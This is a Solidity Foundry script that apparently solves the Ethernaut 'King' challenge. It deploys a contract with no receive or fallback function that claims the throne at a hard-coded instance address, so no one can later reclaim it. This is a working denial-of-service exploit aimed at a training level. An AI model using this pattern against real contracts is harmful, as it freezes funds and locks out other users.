// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TheLastKing {
    constructor(King _kingInstance) payable {
        address(_kingInstance).call{value: _kingInstance.prize()}("");
    }
}
contract KingSolution is Script {

    King public kingInstance = King(payable(0x9418e564798274Fd1b1836d33A567305e859E6a7));
  
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new TheLastKing{value: kingInstance.prize()}(kingInstance); 
        vm.stopBroadcast();
    }
}

